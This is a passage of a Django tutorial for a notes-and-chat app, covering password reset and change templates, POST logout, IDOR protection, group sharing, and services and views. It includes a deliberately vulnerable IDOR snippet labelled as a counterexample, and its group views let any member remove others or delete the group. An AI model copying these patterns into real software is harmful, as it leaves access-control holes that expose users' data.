      <p class="text-center text-muted small mb-0">
        Вже є акаунт? <a href="{% url 'login' %}">Увійти</a>
      </p>

    </div>
  </div>
</div>
{% endblock %}
```

---

## Step 4 — Password Reset

Django provides 4 views for password reset. You only need to write the templates.

### templates/registration/password_reset_form.html

```html
{% extends 'base.html' %}

{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 440px;">
    <div class="card-body p-4">

      <div class="text-center mb-4">
        <i class="bi bi-key-fill display-4 text-warning"></i>
        <h5 class="fw-bold mt-2">Відновлення паролю</h5>
        <p class="text-muted small">
          Введіть ваш email — надішлемо посилання для скидання.
        </p>
      </div>

      <form method="post">
        {% csrf_token %}
        <div class="mb-3">
          <label class="form-label fw-semibold">Email адреса</label>
          <input type="email"
                 name="email"
                 class="form-control"
                 autofocus
                 placeholder="alice@example.com">
          <div class="form-text text-muted">
            Якщо акаунт з таким email існує — отримаєш листа.
            {# Safe: Django doesn't reveal whether the email exists or not #}
          </div>
        </div>
        <button type="submit" class="btn btn-warning w-100 py-2 fw-semibold">
          <i class="bi bi-envelope me-2"></i>Надіслати посилання
        </button>
      </form>

      <div class="text-center mt-3">
        <a href="{% url 'login' %}" class="text-muted small">
          <i class="bi bi-arrow-left me-1"></i>Назад до входу
        </a>
      </div>

    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_reset_done.html

```html
{% extends 'base.html' %}
{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 440px;">
    <div class="card-body p-4 text-center">

      <i class="bi bi-envelope-check-fill display-4 text-success mb-3"></i>
      <h5 class="fw-bold">Посилання надіслано!</h5>
      <p class="text-muted">
        Перевірте вашу пошту і перейдіть за посиланням щоб скинути пароль.
      </p>

      <!-- DEV hint: the email is in docker logs -->
      <div class="alert alert-info text-start small mt-3">
        <strong><i class="bi bi-terminal me-1"></i>DEV режим:</strong>
        Email не надсилається реально. Знайди його у логах Docker:
        <code class="d-block mt-1">docker compose logs -f web</code>
        Скопіюй URL що починається з
        <code>/accounts/reset/...</code>
      </div>

      <a href="{% url 'login' %}" class="btn btn-outline-secondary btn-sm mt-2">
        Повернутись до входу
      </a>

    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_reset_confirm.html

```html
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 440px;">
    <div class="card-body p-4">

      {% if validlink %}
        {# validlink = True → the token is valid (not expired, not used) #}
        <div class="text-center mb-4">
          <i class="bi bi-lock-fill display-4 text-primary"></i>
          <h5 class="fw-bold mt-2">Новий пароль</h5>
        </div>
        <form method="post">
          {% csrf_token %}
          {{ form|crispy }}
          {# SetPasswordForm: new_password1, new_password2 #}
          {# Django automatically runs PASSWORD_VALIDATORS on these fields #}
          <button type="submit" class="btn btn-primary w-100 mt-2 py-2">
            <i class="bi bi-check-lg me-2"></i>Зберегти новий пароль
          </button>
        </form>

      {% else %}
        {# validlink = False → the token has expired (>72 hours) or was already used #}
        <div class="text-center py-3">
          <i class="bi bi-exclamation-triangle-fill display-4 text-danger mb-3"></i>
          <h5 class="fw-bold">Посилання недійсне</h5>
          <p class="text-muted">
            Термін дії посилання вийшов (72 год) або воно вже було використано.
          </p>
          <a href="{% url 'password_reset' %}" class="btn btn-outline-warning mt-2">
            <i class="bi bi-arrow-clockwise me-1"></i>Запросити нове посилання
          </a>
        </div>
      {% endif %}

    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_reset_complete.html

```html
{% extends 'base.html' %}
{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 400px;">
    <div class="card-body p-4 text-center">

      <i class="bi bi-check-circle-fill display-4 text-success mb-3"></i>
      <h5 class="fw-bold">Пароль успішно змінено!</h5>
      <p class="text-muted">Тепер ви можете увійти з новим паролем.</p>
      <a href="{% url 'login' %}" class="btn btn-primary mt-2 py-2 px-4">
        <i class="bi bi-box-arrow-in-right me-2"></i>Увійти
      </a>

    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_reset_email.html — the email text

```
{# This is a PLAIN-TEXT email — no HTML tags! Django looks for this template automatically. #}
Привіт!

Ви запросили скидання пароля для акаунту на Notes Chat App.

Перейдіть за посиланням щоб встановити новий пароль:

{{ protocol }}://{{ domain }}{% url 'password_reset_confirm' uidb64=uid token=token %}

Посилання дійсне 72 години. Після використання воно більше не працюватиме.

Якщо ви не запитували скидання пароля — просто проігноруйте цей лист.
Ваш пароль залишається незмінним.

— Notes Chat App
```

**Variables in the email:**
- `{{ protocol }}` — `http` or `https`
- `{{ domain }}` — `localhost:8001` or `mysite.com`
- `{{ uid }}` — base64-encoded user PK
- `{{ token }}` — an HMAC-signed single-use token

---

## Step 5 — Password Change

Password change requires that the user is **already logged in** (unlike password reset).
`PasswordChangeView` checks `is_authenticated` itself — you don't need `@login_required`.

### templates/registration/password_change_form.html

```html
{% extends 'layouts/dashboard.html' %}
{% load crispy_forms_tags %}

{% block topbar_title %}Зміна пароля{% endblock %}

{% block content %}
<div class="row justify-content-center">
  <div class="col-md-6">
    <div class="card shadow-sm">
      <div class="card-header py-3">
        <h6 class="mb-0 fw-semibold">
          <i class="bi bi-key me-2"></i>Зміна пароля
        </h6>
      </div>
      <div class="card-body">
        <form method="post">
          {% csrf_token %}
          {{ form|crispy }}
          {# PasswordChangeForm: old_password, new_password1, new_password2 #}
          <hr>
          <div class="d-flex gap-2">
            <button type="submit" class="btn btn-primary">
              <i class="bi bi-check-lg me-1"></i>Змінити пароль
            </button>
            <a href="{% url 'notes_app:note_list' %}" class="btn btn-outline-secondary">
              Скасувати
            </a>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_change_done.html

```html
{% extends 'layouts/dashboard.html' %}

{% block topbar_title %}Пароль змінено{% endblock %}

{% block content %}
<div class="card shadow-sm" style="max-width: 480px;">
  <div class="card-body text-center py-5">
    <i class="bi bi-check-circle-fill display-4 text-success mb-3"></i>
    <h5 class="fw-bold">Пароль успішно змінено!</h5>
    <p class="text-muted">Наступного разу входьте з новим паролем.</p>
    <a href="{% url 'notes_app:note_list' %}" class="btn btn-primary mt-2">
      <i class="bi bi-house me-2"></i>До нотаток
    </a>
  </div>
</div>
{% endblock %}
```

### Links in the navbar dropdown

```html
{# templates/layouts/dashboard.html — the user dropdown in the navbar: #}
<ul class="dropdown-menu dropdown-menu-dark dropdown-menu-end shadow">
  <li>
    <span class="dropdown-item-text text-white-50 small">{{ request.user.username }}</span>
  </li>
  <li><hr class="dropdown-divider border-secondary"></li>
  <li>
    <a class="dropdown-item" href="{% url 'notes_app:group_list' %}">
      <i class="bi bi-people me-2"></i>Мої групи
    </a>
  </li>
  <li>
    <a class="dropdown-item" href="{% url 'password_change' %}">
      {# 'password_change' — a built-in URL from django.contrib.auth.urls #}
      <i class="bi bi-key me-2"></i>Змінити пароль
    </a>
  </li>
  <li><hr class="dropdown-divider border-secondary"></li>
  <li>
    <!-- Logout — a POST request (protection against a CSRF logout attack) -->
    <form method="post" action="{% url 'logout' %}">
      {% csrf_token %}
      <button type="submit" class="dropdown-item text-danger">
        <i class="bi bi-box-arrow-right me-2"></i>Вийти
      </button>
    </form>
  </li>
</ul>
```

> **Why is logout a POST and not a GET?**
> GET requests can be embedded in `<img src="/accounts/logout/">` on evil.com.
> Anyone who opened the attacker's page would automatically be logged out.
> POST requires a CSRF token → impossible to perform from another site.

---

## Step 6 — Object-Level Permissions

The pattern applies **in every view** that takes a `pk` and modifies data.

```python
# notes_app/views.py — full implementation of note_edit with all checks:

from django.contrib.auth.decorators import login_required
from django.shortcuts import get_object_or_404, redirect, render
from django.contrib import messages
from django.db.models import Q
from .models import Note
from .forms import NoteForm
from . import services, selectors


@login_required
def note_edit(request, pk):
    """
    Editing a note — two levels of checks:
    1. @login_required          → AuthN: logged in?
    2. Q(user) | Q(group)       → read access: own or group note?
    3. note.user == request.user → AuthZ write: only the owner may edit

    Why a Q-filter and not get_object_or_404(..., user=request.user)?
      get_object_or_404(Note, pk=pk, user=request.user) would block
      group members from viewing the note via the URL /notes/<pk>/edit/.
      The real logic: a group member may READ the note (sees it),
      but only the owner may EDIT it.
    """
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
        pk=pk,
    )
    # ↑ SQL: SELECT * FROM note WHERE pk=<pk> AND (user_id=<uid> OR group_id IN (...))
    # → 404 if neither the owner nor a group member

    if note.user != request.user:
        # A group member may VIEW the note, but not edit someone else's
        messages.error(request, 'Ти не можеш редагувати нотатку іншого користувача.')
        return redirect('notes_app:note_detail', pk=pk)

    if request.method == 'POST':
        form = NoteForm(request.POST, instance=note, user=request.user)
        if form.is_valid():
            # tags — an M2M field; NoteForm.cleaned_data['tags'] → a QuerySet of Tag objects
            # the service needs tag_ids separately (we don't pass the dict directly!)
            tags = form.cleaned_data.get('tags')
            tag_ids = [t.id for t in tags] if tags else []
            services.update_note(
                note,
                title=form.cleaned_data['title'],
                content=form.cleaned_data.get('content', ''),
                priority=form.cleaned_data.get('priority', note.priority),
                notebook=form.cleaned_data.get('notebook'),
                is_pinned=form.cleaned_data.get('is_pinned', note.is_pinned),
                group=form.cleaned_data.get('group'),
                tag_ids=tag_ids,
            )
            # update_note(note, *, title, content, ...) — keyword-only args
            # You can't call it as update_note(note, form.cleaned_data) → TypeError
            messages.success(request, f'✅ Нотатку "{note.title}" оновлено!')
            return redirect('notes_app:note_detail', pk=note.pk)
    else:
        form = NoteForm(instance=note, user=request.user)

    return render(request, 'notes_app/note_form.html', {
        'form': form,
        'title': f'Редагувати: {note.title}',
        'note': note,
        'action': 'Зберегти зміни',
    })


@login_required
def note_delete(request, pk):
    # Similarly: Q-filter for access + owner check before deletion
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
        pk=pk,
    )
    if note.user != request.user:
        messages.error(request, 'Ти не можеш видалити нотатку іншого користувача.')
        return redirect('notes_app:note_list')
    if request.method == 'POST':
        title = note.title
        services.delete_note(note)
        messages.warning(request, f'🗑️ Нотатку "{title}" видалено.')
        return redirect('notes_app:note_list')
    return render(request, 'notes_app/note_confirm_delete.html', {'note': note})
```

**Before vs After:**

```python
# ✗ BEFORE (IDOR vulnerability):
note = get_object_or_404(Note, pk=pk)
# SQL: SELECT * FROM note WHERE pk=43
# Returns Bob's note if pk=43 — no owner check at all!

# ✓ AFTER for personal objects (Notebook, TodoList, etc.):
notebook = get_object_or_404(Notebook, pk=pk, user=request.user)
# SQL: SELECT * FROM notebook WHERE pk=43 AND user_id=42
# pk=43 + user_id=42 → not found → 404

# ✓ AFTER for shared objects (Note — may belong to a group):
user_groups = request.user.groups.all()
note = get_object_or_404(
    Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
    pk=pk,
)
# SQL: SELECT * FROM note WHERE pk=43 AND (user_id=42 OR group_id IN (1,3))
# Owner OR group member — both get read access
# For writing: we additionally check note.user == request.user separately
```

---

## Step 7 — Models: Group FK

**Location:** `notes_app/models.py`

```python
from django.contrib.auth.models import User, Group


class Note(models.Model):
    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='notes'
    )
    # ── Group FK: for shared access ──────────────────────────────────────────
    group = models.ForeignKey(
        Group,
        on_delete=models.SET_NULL,  # ← SET_NULL, not CASCADE!
        null=True,                   # ← NULL = personal note (by default)
        blank=True,                  # ← the field is optional in the form
        related_name='notes',
    )
    # ── the remaining fields ──────────────────────────────────────────────────
    notebook = models.ForeignKey(
        'Notebook', on_delete=models.SET_NULL, null=True, blank=True,
        related_name='notes'
    )
    title    = models.CharField(max_length=200)
    content  = models.TextField(blank=True)
    priority = models.PositiveSmallIntegerField(default=1)
    is_pinned    = models.BooleanField(default=False)
    is_archived  = models.BooleanField(default=False)
    created_at   = models.DateTimeField(auto_now_add=True)
    updated_at   = models.DateTimeField(auto_now=True)
    tags = models.ManyToManyField('Tag', blank=True)


class ShoppingList(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    # ShoppingList also has a group FK for sharing:
    group = models.ForeignKey(
        Group,
        on_delete=models.SET_NULL,
        null=True, blank=True,
        related_name='shopping_lists',
    )
    title = models.CharField(max_length=200)
    store_name = models.CharField(max_length=100, blank=True)
```

### Why `SET_NULL` and not `CASCADE`?

```
CASCADE:  deleting a group → ALL of the group's notes are deleted
          Alice deletes "Development Team" → Bob loses the shared notes!
          Unexpected and irreversible.

SET_NULL: deleting a group → the notes remain but become personal (group=NULL)
          Alice deletes the group → the notes move to their owners' personal spaces
          Safe behavior: no data is lost, only the sharing stops.

Django performs SET_NULL automatically during a CASCADE delete:
  DELETE FROM auth_group WHERE id=5
  → UPDATE note SET group_id=NULL WHERE group_id=5     ← automatically!
  → UPDATE shoppinglist SET group_id=NULL WHERE group_id=5  ← this too!
```

---

## Step 8 — Selectors

**Location:** `notes_app/selectors.py`

```python
from django.db.models import Q, Count
from django.contrib.auth.models import Group
from .models import Note, Notebook, Tag


def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """
    Returns the user's notes + notes of the groups they belong to.

    Q(user=user) | Q(group__in=user_groups) — the key Q-filter.
    select_related/prefetch_related: a minimum of SQL queries (no N+1).
    """
    user_groups = user.groups.all()
    qs = Note.objects.filter(
        Q(user=user) | Q(group__in=user_groups),   # own or group notes
        is_archived=archived,
    ).select_related(
        'notebook',   # JOIN → no +1 SQL when displaying the notebook color
        'group',      # JOIN → no +1 SQL when displaying the group name
    ).prefetch_related(
        'tags',       # IN query → no +1 SQL when displaying tags
    )

    if notebook is not None:
        qs = qs.filter(notebook=notebook)
    if tag is not None:
        qs = qs.filter(tags=tag)
    if search:
        qs = qs.filter(
            Q(title__icontains=search) | Q(content__icontains=search)
        )

    return qs.order_by('-is_pinned', '-priority', '-updated_at')


def get_user_groups(user):
    """The user's groups with the number of members (annotate)."""
    return user.groups.annotate(
        member_count=Count('user')
        # annotate: adds a 'member_count' field to each Group object
        # SQL: SELECT g.*, COUNT(ug.user_id) as member_count
        #        FROM auth_group g
        #        JOIN auth_user_groups ug ON ug.group_id = g.id
        #        WHERE g.id IN (Alice's group ids)
        #        GROUP BY g.id
    ).order_by('name')


def get_group_with_members(group_id, user):
    """
    Returns the group with its members ONLY if the user is a member.
    If not a member → None (not Http404 — the view decides).
    """
    try:
        group = Group.objects.prefetch_related('user_set').get(pk=group_id)
        if not group.user_set.filter(pk=user.pk).exists():
            return None   # not a member → the view will return 404
        return group
    except Group.DoesNotExist:
        return None
```

**Explanation of `select_related` vs `prefetch_related`:**

```python
# select_related: JOIN → one SQL query
# Used for ForeignKey and OneToOne (N-to-1)
.select_related('notebook')
# SQL: SELECT note.*, nb.* FROM note LEFT JOIN notebook nb ON note.notebook_id = nb.id

# prefetch_related: a separate IN query → two SQL queries
# Used for ManyToMany (M-to-N)
.prefetch_related('tags')
# SQL 1: SELECT note.* FROM note WHERE ...
# SQL 2: SELECT tag.* FROM tag INNER JOIN note_tags ON ... WHERE note_id IN (1,2,3,...)

# Without select_related/prefetch_related → the N+1 problem:
# 10 notes → 10 queries for notebook + 10 for tags = 21 SQL queries!
# With the optimization → 3 SQL queries (notes + notebooks + tags)
```

---

## Step 9 — Services

**Location:** `notes_app/services.py`

```python
from django.contrib.auth.models import Group, User
from django.db import transaction


def create_group(*, name, creator):
    """
    Creates a group and automatically adds creator as the first member.

    Without a transaction: if add() fails → the Group exists without members.
    With atomic(): both operations succeed or both are rolled back.
    """
    with transaction.atomic():
        group = Group.objects.create(name=name)
        group.user_set.add(creator)   # M:N INSERT into auth_user_groups
    return group


def add_user_to_group(group, username):
    """
    Adds a user to the group by username.
    Returns (True, '') or (False, 'error message').

    Why not raise an Exception?
    The view expects a tuple (ok, msg) to display the error in the form without a 500.
    """
    try:
        user = User.objects.get(username=username)
    except User.DoesNotExist:
        return False, f'Користувача «{username}» не знайдено.'

    if group.user_set.filter(pk=user.pk).exists():
        return False, f'«{username}» вже є членом цієї групи.'

    group.user_set.add(user)
    return True, ''


def remove_user_from_group(group, user):
    """Removes a user from the group. M:N DELETE from auth_user_groups."""
    group.user_set.remove(user)


def delete_group(group):
    """
    Deletes the group.
    Django automatically applies SET_NULL to Note.group and ShoppingList.group.
    No notes are lost.
    """
    group.delete()
```

---

## Step 10 — Group Views

**Location:** `notes_app/views.py`

```python
from django.contrib.auth.models import Group, User
from django.core.exceptions import PermissionDenied
from django.http import Http404
from . import selectors, services


@login_required
def group_list(request):
    """List of groups the current user belongs to."""
    groups = selectors.get_user_groups(request.user)
    return render(request, 'notes_app/group_list.html', {'groups': groups})


@login_required
def group_create(request):
    """
    Creating a new group. The creator automatically becomes the first member.

    Validation is done through the GroupCreateForm form, not manually via request.POST.get().
    Advantages of forms over raw POST:
      • clean_name() checks name uniqueness automatically
      • All errors are available via form.errors → we render them in the template
      • Consistent with the other views — one approach across the whole project
      • DRY: the validation logic is in one place (forms.py), not in every view
    """
    if request.method == 'POST':
        form = GroupCreateForm(request.POST)
        if form.is_valid():
            group = services.create_group(
                name=form.cleaned_data['name'],
                creator=request.user,
            )
            messages.success(request, f'✅ Групу «{group.name}» створено! Ви перший учасник.')
            return redirect('notes_app:group_detail', pk=group.pk)
    else:
        form = GroupCreateForm()
    return render(request, 'notes_app/group_form.html', {
        'form': form, 'title': 'Нова група', 'action': 'Створити',
    })


@login_required
def group_detail(request, pk):
    """
    Viewing a group: members + actions (add/remove/leave).

    One view — three actions through one POST:
      action='add'    → add a member by username
      action='remove' → remove a specific member (by user_pk)
      action='leave'  → the current user leaves the group
    """
    group = selectors.get_group_with_members(pk, request.user)
    if group is None:
        raise Http404('Групу не знайдено або у вас немає доступу.')

    error = None

    if request.method == 'POST':
        action = request.POST.get('action')

        if action == 'add':
            username = request.POST.get('username', '').strip()
            ok, msg = services.add_user_to_group(group, username)
            if ok:
                messages.success(request, f'«{username}» додано до групи.')
                return redirect('notes_app:group_detail', pk=pk)
            else:
                error = msg

        elif action == 'remove':
            remove_pk = request.POST.get('user_pk')
            try:
                target = User.objects.get(pk=remove_pk)
                if target == request.user:
                    messages.error(request, 'Щоб покинути групу — використай кнопку "Покинути".')
                else:
                    services.remove_user_from_group(group, target)
                    messages.success(request, f'«{target.username}» видалено з групи.')
            except User.DoesNotExist:
                pass
            return redirect('notes_app:group_detail', pk=pk)

        elif action == 'leave':
            group_name = group.name
            services.remove_user_from_group(group, request.user)
            messages.info(request, f'Ви покинули групу «{group_name}».')
            return redirect('notes_app:group_list')

    return render(request, 'notes_app/group_detail.html', {
        'group':   group,
        'members': group.user_set.all(),
        'error':   error,
    })


@login_required
def group_delete(request, pk):
    """
    Deleting a group.
    Only if request.user is a member → 403 (we know the group exists).
    """
    group = get_object_or_404(Group, pk=pk)
    if not group.user_set.filter(pk=request.user.pk).exists():
        raise PermissionDenied   # 403: we know it exists, but there is no access
    if request.method == 'POST':
        name = group.name
        services.delete_group(group)
        messages.warning(
            request,
            f'Групу «{name}» видалено. Спільні нотатки і списки стали особистими.'
        )
        return redirect('notes_app:group_list')
    return render(request, 'notes_app/group_confirm_delete.html', {'group': group})
```

**Key pattern — one view, three actions:**

```
POST /groups/5/   {action: 'add',    username: 'bob'}     → add Bob
POST /groups/5/   {action: 'remove', user_pk: 99}         → remove user.pk=99
POST /groups/5/   {action: 'leave'}                       → the current user leaves

Why one view and not three URLs?
  - All group management logic is in one place
  - A shared middleware check (membership)
  - Easier to test (one TestCase class test)
  - Fewer URL patterns
```

---

## Step 11 — Group Templates

**Location:** `notes_app/templates/notes_app/`

### group_list.html — group cards

```html
{% extends 'layouts/dashboard.html' %}
{% block topbar_title %}Мої групи{% endblock %}
{% block content %}

<div class="d-flex justify-content-between align-items-center mb-4">
  <h5 class="fw-semibold mb-0">
    <i class="bi bi-people me-2 text-primary"></i>Мої групи
  </h5>
  <a href="{% url 'notes_app:group_create' %}" class="btn btn-primary btn-sm">
    <i class="bi bi-person-plus me-1"></i>Нова група
  </a>
</div>

{% if groups %}
<div class="row row-cols-1 row-cols-md-3 g-3">
  {% for group in groups %}
  <div class="col">
    <div class="card h-100 shadow-sm border-0">
      <div class="card-body">
        <h6 class="fw-semibold mb-1">{{ group.name }}</h6>
        <p class="text-muted small mb-0">
          <i class="bi bi-person me-1"></i>
          {{ group.member_count }} учасник{{ group.member_count|pluralize:",и,ів" }}
          {# member_count = annotate from the get_user_groups selector #}
        </p>
      </div>
      <div class="card-footer bg-transparent border-0 pt-0">
        <a href="{% url 'notes_app:group_detail' group.pk %}"
           class="btn btn-outline-primary btn-sm">
          <i class="bi bi-arrow-right me-1"></i>Відкрити
        </a>
        <a href="{% url 'notes_app:group_chat' group.pk %}"
           class="btn btn-outline-success btn-sm ms-1">
          <i class="bi bi-chat me-1"></i>Чат
        </a>
      </div>
    </div>
  </div>
  {% endfor %}
</div>

{% else %}
<div class="text-center py-5 text-muted">
  <i class="bi bi-people display-4 mb-3"></i>
  <h6>Груп ще немає</h6>
  <p class="small">Створи групу і додай учасників для спільного доступу до нотаток.</p>
  <a href="{% url 'notes_app:group_create' %}" class="btn btn-primary btn-sm">
    Створити першу групу
  </a>
</div>
{% endif %}

{% endblock %}
```

### group_detail.html — members and actions

```html
{% extends 'layouts/dashboard.html' %}
{% block topbar_title %}Група: {{ group.name }}{% endblock %}
{% block content %}

<div class="row g-4">

  <!-- ── Member list ── -->
  <div class="col-md-6">
    <div class="card shadow-sm">
      <div class="card-header d-flex justify-content-between align-items-center">
        <h6 class="mb-0">
          <i class="bi bi-people me-2"></i>Учасники ({{ members.count }})
        </h6>
      </div>
      <ul class="list-group list-group-flush">
        {% for member in members %}
        <li class="list-group-item d-flex justify-content-between align-items-center">
          <span>
            <i class="bi bi-person-circle me-2 text-muted"></i>
            {{ member.username }}
            {% if member == request.user %}
              <span class="badge bg-success rounded-pill ms-1">Ти</span>
            {% endif %}
          </span>
          <!-- Remove a member — action=remove -->
          {% if member != request.user %}
          <form method="post" class="d-inline">
            {% csrf_token %}
            <input type="hidden" name="action" value="remove">
            <input type="hidden" name="user_pk" value="{{ member.pk }}">
            <button type="submit"
                    class="btn btn-outline-danger btn-sm"
                    onclick="return confirm('Видалити {{ member.username }} з групи?')">
              <i class="bi bi-x-lg"></i>
            </button>
          </form>
          {% endif %}
        </li>
        {% endfor %}
      </ul>
    </div>
  </div>

  <!-- ── Actions panel ── -->
  <div class="col-md-6">

    <!-- Add a member — action=add -->
    <div class="card shadow-sm mb-3">
      <div class="card-header">
        <h6 class="mb-0"><i class="bi bi-person-plus me-2"></i>Додати учасника</h6>
      </div>
      <div class="card-body">
        {% if error %}
        <div class="alert alert-danger py-2 small mb-3">
          <i class="bi bi-exclamation-circle me-1"></i>{{ error }}
        </div>
        {% endif %}
        <form method="post" class="d-flex gap-2">
          {% csrf_token %}
          <input type="hidden" name="action" value="add">
          <input type="text"
                 name="username"
                 class="form-control form-control-sm"
                 placeholder="username учасника"
                 required>
          <button type="submit" class="btn btn-primary btn-sm">
            <i class="bi bi-plus-lg"></i>
          </button>
        </form>
      </div>
    </div>

    <!-- Group chat -->
    <div class="card shadow-sm mb-3">
      <div class="card-body d-flex align-items-center gap-3">
        <i class="bi bi-chat-dots-fill text-success fs-4"></i>
        <div>
          <h6 class="mb-0">Груповий чат</h6>
          <p class="text-muted small mb-0">WebSocket чат у реальному часі</p>
        </div>
        <a href="{% url 'notes_app:group_chat' group.pk %}"
           class="btn btn-outline-success btn-sm ms-auto">
          Відкрити чат
        </a>
      </div>
    </div>

    <!-- Danger zone: leave or delete -->
    <div class="card border-danger shadow-sm">
      <div class="card-header border-danger">
        <h6 class="text-danger mb-0">
          <i class="bi bi-exclamation-triangle me-2"></i>Небезпечна зона
        </h6>
      </div>
      <div class="card-body">
        <!-- Leave the group — action=leave -->
        <form method="post" class="d-inline">
          {% csrf_token %}
          <input type="hidden" name="action" value="leave">
          <button type="submit"
                  class="btn btn-outline-danger btn-sm me-2"
                  onclick="return confirm('Покинути групу «{{ group.name }}»?')">
            <i class="bi bi-door-open me-1"></i>Покинути групу
          </button>
        </form>
        <!-- Delete the group — a separate URL (GET → confirm page) -->
        <a href="{% url 'notes_app:group_delete' group.pk %}"
           class="btn btn-danger btn-sm">
          <i class="bi bi-trash me-1"></i>Видалити групу
        </a>
      </div>
    </div>

  </div>
</div>
{% endblock %}
```

### group_confirm_delete.html

```html
{% extends 'layouts/dashboard.html' %}
{% block topbar_title %}Видалення групи{% endblock %}
{% block content %}

<div class="card border-danger shadow-sm" style="max-width: 500px;">
  <div class="card-header bg-danger text-white">
    <h6 class="mb-0">
      <i class="bi bi-trash me-2"></i>Видалення групи «{{ group.name }}»
    </h6>
  </div>
  <div class="card-body">
    <div class="alert alert-warning">
      <strong><i class="bi bi-exclamation-triangle me-1"></i>Після видалення:</strong>
      <ul class="mb-0 mt-2 ps-3">
        <li>Група та список учасників видаляться <strong>назавжди</strong>.</li>
        <li>Нотатки і списки покупок <strong>НЕ видаляються</strong> —
            вони стають особистими (<code>group = NULL</code>
            через <code>on_delete=SET_NULL</code>).</li>
        <li>Чат групи і всі повідомлення <strong>видаляться</strong>
            (<code>ChatMessage.group FK CASCADE</code>).</li>
      </ul>
    </div>
    <form method="post">
      {% csrf_token %}
      <button type="submit" class="btn btn-danger me-2">
        <i class="bi bi-trash me-1"></i>Так, видалити
      </button>
      <a href="{% url 'notes_app:group_detail' group.pk %}"
         class="btn btn-outline-secondary">
        Скасувати
      </a>
    </form>
  </div>
</div>

{% endblock %}
```

---

## File structure

```
notes_chat_app/
│
├── notes_project/
│   ├── settings.py          ★ LOGIN_URL, EMAIL_BACKEND, CSRF_TRUSTED_ORIGINS,
│   │                           SESSION_COOKIE_HTTPONLY, X_FRAME_OPTIONS
│   └── urls.py              ★ include('django.contrib.auth.urls') + notes_app
│
├── notes_app/
│   ├── models.py            ★ Note.group FK(Group, SET_NULL)
│   │                           ShoppingList.group FK(Group, SET_NULL)
│   │                           ChatMessage.group FK(Group, CASCADE)
│   ├── selectors.py         ★ get_user_notes (Q filter)
│   │                           get_user_groups (annotate member_count)
│   │                           get_group_with_members (membership check)
│   ├── services.py          ★ create_group, add_user_to_group,
│   │                           remove_user_from_group, delete_group
│   ├── views.py             ★ register, group_list, group_create,
│   │                           group_detail (3-action POST), group_delete
│   │                           + IDOR protection in note_edit, note_delete, etc.
│   ├── consumers.py         ★ GroupChatConsumer (WebSocket, membership check)
│   ├── urls.py              ★ /groups/ + /register/ URL patterns
│   ├── context_processors.py ← sidebar: notebooks + tags (unchanged)
│   └── templates/notes_app/
│       ├── note_list.html       ← Q-filtered notes (personal + group)
│       ├── note_form.html       ← group field in the form
│       ├── group_list.html      ← group cards with member_count  ★
│       ├── group_form.html      ← form for the new group's name  ★
│       ├── group_detail.html    ← members, action=add/remove/leave ★
│       └── group_confirm_delete.html ← SET_NULL explanation    ★
│
└── templates/
    ├── base.html                ← Bootstrap CDN, messages block
    ├── layouts/
    │   └── dashboard.html       ← "Groups" in the sidebar + dropdown:
    │                               "Change password", "Log out" (POST logout)
    ├── registration/
    │   ├── login.html           ★ CSRF token, "next" hidden input
    │   ├── register.html        ★ UserCreationForm + crispy
    │   ├── password_reset_form.html    ★ email form
    │   ├── password_reset_done.html    ★ DEV: hint about docker logs
    │   ├── password_reset_confirm.html ★ validlink check + crispy form
    │   ├── password_reset_complete.html ★ success + login link
    │   ├── password_reset_email.html   ★ email text (protocol/domain/token)
    │   ├── password_change_form.html   ★ PasswordChangeForm + crispy
    │   └── password_change_done.html   ★ success
    └── components/
        ├── empty_state.html
        ├── pagination.html
        └── confirm_modal.html
```

---

## Checking in the browser

| Action | URL | What to check |
|-----|-----|---------------|
| Registration | `/register/` | Auto-login → redirect `/notes/` |
| Login | `/accounts/login/` | session cookie in DevTools → Application → Cookies |
| Login CSRF | DevTools → Application → Cookies | csrftoken is present |
| Logout | POST button | The sessionid cookie is deleted |
| Password Reset | `/accounts/password_reset/` | Email in `docker compose logs web` |
| Expired token | `/accounts/reset/...` (old URL) | `validlink=False` → "Посилання недійсне" (Link is invalid) |
| IDOR test | `/notes/2/edit/` (someone else's note) | 404 (not 403!) |
| Password Change | `/accounts/password_change/` | old_password is checked |
| Group | `/groups/new/` → `/groups/<pk>/` | creator is a member |
| Group notes | Tag a note with a group | Another member sees it in /notes/ |
| Group chat | `/groups/<pk>/chat/` | WebSocket connection |
| DELETE group | `/groups/<pk>/delete/` → POST | Notes become personal (group=NULL) |

---

## Summary: what to look for and where

| Concept | Where in the code |
|-----------|-----------|
| **AuthN vs AuthZ** | `views.py` — `@login_required` + Q-filter for access + `note.user != request.user` for editing |
| **Middleware chain** | `settings.py` — the `MIDDLEWARE` list + its order |
| **Session flow** | `settings.py` — `SESSION_COOKIE_*` + the Django session framework |
| **Login/Logout** | `templates/registration/login.html` + `urls.py` auth.urls |
| **POST logout** | `dashboard.html` — `<form method="post" action="{% url 'logout' %}">` |
| **Password Reset** | `templates/registration/password_reset_*.html` (5 files) |
| **DEV email** | `docker compose logs -f web` — find the URL `/accounts/reset/...` |
| **Password Change** | `templates/registration/password_change_*.html` + dashboard dropdown |
| **IDOR protection** | `views.py` — personal objects: `get_object_or_404(Notebook, pk=pk, user=...)`, shared: Q-filter + owner check |
| **404 not 403** | `views.py` — "don't reveal the existence of someone else's object" |
| **Group FK SET_NULL** | `models.py` — `Note.group` + `ShoppingList.group` |
| **Q-filter** | `selectors.py` — `Q(user=user) \| Q(group__in=user_groups)` |
